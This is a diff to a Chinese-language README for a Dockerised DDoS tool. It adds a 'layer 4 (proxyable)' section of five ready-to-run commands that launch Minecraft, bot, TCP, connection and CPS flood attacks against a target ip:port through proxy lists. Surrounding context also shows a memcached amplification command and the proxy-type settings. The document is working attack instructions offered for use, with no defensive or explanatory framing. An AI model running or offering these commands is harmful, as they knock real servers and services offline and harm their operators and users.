@@ -24,6 +24,18 @@ MEM放大
 
 	docker exec -it ddos-layer7 python3 start.py MEM ip:port 1 60 meme.txt &
 
+第四层（可代理）
+
+	docker exec -it ddos-layer7 python3 start.py MINECRAFT ip:port 1 120 0 all.txt &
+ 
+	docker exec -it ddos-layer7 python3 start.py MCBOT ip:port 1 120 0 all.txt &
+ 
+	docker exec -it ddos-layer7 python3 start.py TCP ip:port 1 120 0 all.txt &
+ 
+	docker exec -it ddos-layer7 python3 start.py CONNECTION ip:port 1 120 0 all.txt &
+ 
+	docker exec -it ddos-layer7 python3 start.py CPS ip:port 1 120 0 all.txt &
+
 
 ### 脚本的使用
 	Proxy Types 0=All Proxy  1=HTTP  4=SOCKS4  5=SOCKS5
